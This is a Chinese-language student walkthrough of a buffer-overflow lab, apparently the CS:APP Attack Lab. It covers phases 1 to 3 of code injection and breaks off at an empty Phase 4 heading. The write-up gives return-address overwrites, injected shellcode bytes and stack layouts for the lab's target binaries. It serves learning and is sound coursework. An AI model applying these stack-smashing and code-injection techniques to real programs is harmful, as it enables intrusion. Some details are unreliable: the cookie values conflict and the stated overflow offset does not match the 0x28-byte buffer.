解释一下各个文件的作用
README.txt:描述目录内容的文件
ctarget:易受代码注入攻击的可执行程序
rtarget:易受面向返回的编程攻击的可执行程序
cookie.txt:一个八位数的十六进制代码,攻击中使用其作为唯一标识符
farm.c:目标的"gadget farm",用于生成面向返回的编程攻击
hex2raw:生成攻击字符串的程序

目标代码ctarget和rtarget都适用自定义函数getbuf来读取字符串
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
Gets函数与标准库函数gets用法相似, BUFFER_SIZE是特定于程序版本的常数

根据用户输入的字符串长度和内容分为以下几种:
#1输入过短 
cookie:0x1a7dd803
Type string:Keep it Short!
No exploit. Getbuf returned 0x1
Normal return

#2输入足够长
cookie:0x1a7dd803
Type string:This is not a very interesting string, but it has the property ...
Ouch!: You caused a segmentation fault!
Better luck next time

该lab的任务是巧妙的处理提供给目标代码漏洞字符串  exploit strings

需要注意的：
#1 exploit strings不要出现0x0a,因为这是换行符'\n'的ASCII码,gets函数识别到该字节会终止输入
#2 hex2raw需要用一个或多个空格分隔的两位十六进制,如果要创建单词0xdeadbeef,输入ef be ad de
   (需要注意大小段机的转换)

个人感觉还是怎么看懂他这个实验说明,猜测一下是把想要输入getbuf的字符串的内容通过hex2raw转换
hex2raw,顾名思义将16进制转为字符串再输入进ctarget或rtarget。
下面正式开始解题：


#Phase_1################################################################################
0000000000401968 <test>:代码test中调用了getbuf
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08            	add    $0x8,%rsp
  401990:	c3                   	retq 


00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>

调用关系图：
test()
  ↓ 
getbuf()
  ↓
gets()

我们需要注入代码使得Gets返回时调用touch1函数
输入字符在28~36时破坏返回地址,需要修改成004017c0
注意,这是00 40 17 c0是字符对应的ascii码
输入012345678901234567890123456 004017c0后查看栈中值发现
0x5561dca0  0x00401976  ret
0x5561dc98  0x10101010
0x5561dc90  0x10101010
0x5561dc88  0x10101010
0x5561dc80  0x10101010
0x5561dc78  0x10101010

#Phase_2################################################################################
在上一题的基础上,Phase_2要求返回touch2,下面是touch2函数的声明
00000000004017ec <touch2>:
void touch2(unsigned val)
{
  vlevel = 2; /* Part of validation protocol */
  if (val == cookie) {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  } else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
    }
  exit(0);
}
在test()中调用getbuf后返回到0x4017ec这个地址的同时,要求修改寄存器%rdi的值为cookie
ps:调用函数的第一个参数存储在寄存器%rdi中
ps:cookie的内容为0x59b997fa

如果只依靠buffer溢出,只能破坏cller栈帧中的返回地址,无法修改%rdi的值,所以我们必须还要依靠注入
可执行代码来实现,查阅文档提示:修改的返回地址只能指向
#1 the addresses of funcs touch1 touch2 touch3
#2 the addresses of your injected code
#3 the addresses of one of your 'gadgets' from the 'gadget farm'
所以我们应该修改返回地址为注入代码的地址,那么问题来了,修改完getbuf函数的返回地址后,要如何跳转
到touch2呢? 这需要我们在注入的代码中实现,但是实验要求不能使用jmp等一系列跳转指令.

复习ret指令
等价于pop %rip   即将栈中存放的地址弹出作为下一条指令的地址
综上我们可以写出需要的注入代码:
mov $0x59b997fa,%rdi   # 将cookie给%rdi
push $0x4017ec         # 将touch2的返回地址压入栈中
ret                    # 手动使用ret返回到touch2的地址
查阅文档的附录后使用gcc和objdump指令生成其对应的16进制数字
48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
68 ec 17 40 00       	pushq  $0x4017ec
c3                   	retq 
如果从%rsp的位置开始写入可执行代码,那么栈帧的存放情况如下:

     0x5561dca0  %rsp 注入可执行代码的地址
     0x5561dc98  0x10101010
     0x5561dc90  0x10101010
                 ret
                 push $0x4017ec
%rsp→0x5561dc78  mov  $0x59b997fa,%rdi
这里执行可执行代码是往地址增大的方向进行,所以可执行代码的地址应该是%rsp的位置
总结一下,在phase_1基础上
#1添加上述可执行程序对应的16进制数字
#2将caller栈帧中存放的返回地址修改为注入代码的地址


#Phase_3################################################################################
这次要让getbuf修改返回地址到touch3,传递的参数依旧需要修改%rdi
使%rdi的值等于一个地址:指向某个特定的字符串"59b997fa"
查阅ASCII码可知:35 39 62 39 39 37 66 61
  补充:还有最最最最重要的一点,C语言中字符串的末尾以'\0'结尾,所以末尾必须加上00
  即: 35 39 62 39 39 37 66 61 00
  同时需要注意的是,以16进制数字传给buf时,对于字符串不需要考虑大小端机器,只有取地址的时候才考虑
touch3地址:00000000004018fa

看到文档中"se register %rdi to the address of the string"后立刻就能够想到
将字符串存放在为getbuf开辟的空间中,并让%rdi指向其 所以我们getbuf输入的内容第一部分为字符串的ascii码
输入后的栈帧存放信息:
0x5561dca0  存储指令开始的地址:0x5561dc81
0x5561dc98  任意
0x5561dc90  任意
0x5561dc88~0x5561dc90 存储指令 push   $0x4018fa 和 ret
0x5561dc81~0x5561dc88 存储指令 mov    $0x5561dc78,%rdi
0x5561dc78~0x5561dc81 存储字符串的ASCII码: 35 39 62 39 39 37 66 61 00

但是这样存放的字符串遇到touch3调用的函数hexmatch后会出现问题,文档中的hexmatch函数:
int hexmatch(unsigned val, char *sval)
{
1  char cbuf[110];
  /* Make position of check string unpredictable */
2  char *s = cbuf + random() % 100;
3  sprintf(s, "%.8x", val);
4  return strncmp(sval, s, 9) == 0;
}
使用gdb检查后我们会发现当我们注入的代码执行完毕ret到touch3调用hexmatch后,栈中数据存储为
0x5561dca0 caller ret地址
0x5561dc98 caller ret地址
0x5561dc90~0x5561dc78 寄存器
0x5561dc78~0x5561dc00 cbuf

看到hexmatch函数第二三条指令,从范围0x5561dc78~0x5561dc00中随机一个地址写入
而我们原本的字符串存放地址为0x5561dc78~0x5561dc81 这完全有可能覆盖掉我们的字符串从而导致
strncmp匹配失败,而前面的地址0x5561dca0~0x5561dc78又被占用,所以我们字符串存储的位置只能
另寻一处,即从test栈帧寻得一处,好消息所有函数都没有修改过0x5561dca0以前的栈帧内容
所以将字符串存放在0x5561dca0~0x5561dca9即可

最终输入后的栈帧存放内容：
0x5561dcb1~0x5561dca8 存储字符串的ASCII码: 35 39 62 39 39 37 66 61 00
0x5561dca0  存储指令开始的地址:0x5561dc81
0x5561dc98  任意
0x5561dc90  任意
0x5561dc78~0x5561d88 可执行代码

#Phase_4################################################################################
